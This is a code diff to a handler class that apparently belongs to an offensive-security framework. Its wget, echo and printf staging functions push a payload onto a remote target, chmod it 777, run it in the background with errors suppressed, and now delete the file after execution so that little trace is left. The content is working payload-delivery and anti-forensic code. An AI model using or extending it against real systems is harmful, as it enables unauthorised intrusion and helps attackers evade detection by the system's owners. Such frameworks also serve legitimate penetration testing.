@@ -90,9 +90,9 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
+            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &\n".encode())
         else:
-            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &")
         return wget_container
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
@@ -121,9 +121,9 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &\n".encode())
         else:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &")
     
     def printf_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
@@ -151,9 +151,9 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &\n".encode())
         else:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &")
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
